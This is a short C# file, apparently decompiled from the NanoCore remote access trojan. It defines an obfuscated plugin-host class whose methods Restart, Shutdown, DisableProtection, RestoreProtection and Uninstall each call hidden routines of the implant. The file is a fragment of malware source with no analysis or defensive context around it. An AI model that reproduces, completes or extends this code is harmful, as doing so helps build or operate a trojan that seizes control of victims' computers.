using NanoCore.ClientPluginHost;

public sealed class GClass10 : IClientAppHost
{
	public GClass3 gclass3_0;

	public GClass10(GClass3 gclass3_1)
	{
		gclass3_0 = gclass3_1;
	}

	public void Restart()
	{
		Class8.smethod_41();
	}

	public void Shutdown()
	{
		Class8.smethod_42();
	}

	public void DisableProtection()
	{
		Class8.smethod_45();
	}

	public void RestoreProtection()
	{
		Class8.smethod_46();
	}

	public void Uninstall()
	{
		Class8.smethod_91();
	}
}
